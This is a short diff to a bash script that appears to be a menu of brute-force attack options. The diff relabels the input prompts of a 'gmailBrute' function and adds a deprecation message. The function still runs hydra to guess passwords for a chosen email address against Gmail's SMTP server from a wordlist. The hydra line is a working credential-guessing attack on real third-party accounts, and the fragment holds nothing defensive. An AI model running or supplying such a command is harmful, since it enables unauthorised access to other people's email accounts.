@@ -25,8 +25,10 @@ ftpBrute() {
 }
 
 gmailBrute() {
-	read -p "[*] User: " email
-	read -p "[*] IP/Hostname: " wordlist
+	echo "This option is deprecated"
+
+	read -p "[*] Email: " email
+	read -p "[*] Wordlist: " wordlist
 
 	hydra -l $email -P $wordlist -s 465 smtp.gmail.com smtp
 }
